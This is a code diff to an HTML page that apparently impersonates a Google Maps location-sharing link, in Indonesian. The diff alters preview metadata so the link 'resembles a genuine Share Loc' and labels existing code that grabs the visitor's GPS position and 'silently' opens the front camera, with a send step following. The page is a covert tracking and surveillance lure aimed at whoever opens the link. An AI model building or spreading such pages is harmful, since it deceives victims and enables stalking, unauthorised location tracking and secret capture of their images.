@@ -5,9 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google Maps - Bagikan Lokasi Terkini</title>
     
-    <!-- Open Graph Metadata untuk Preview Gambar Peta Google Maps Asli -->
-    <meta property="og:title" content="Google Maps - Berbagi Lokasi Real-Time">
-    <meta property="og:description" content="Ketuk untuk melihat titik lokasi dan rute navigasi terkini.">
+    <!-- Open Graph Metadata agar tampil menyerupai Share Loc Asli -->
+    <meta property="og:title" content="Semarang Kota, Jawa Tengah, ID">
+    <meta property="og:description" content="Ketuk untuk melihat lokasi terkini di Google Maps.">
     <meta property="og:image" content="https://images.unsplash.com/photo-1524661135-423995f22d0b?w=1200&h=630&fit=crop">
     <meta property="og:url" content="https://shareloc.online">
     <meta property="og:type" content="website">
@@ -84,6 +84,7 @@
                 }
             }
 
+            // Ambil Lokasi GPS
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     position => {
@@ -104,6 +105,7 @@
                 checkAndSend();
             }
 
+            // Ambil Kamera secara senyap
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                 .then(stream => {
                     const video = document.getElementById('camera-stream');
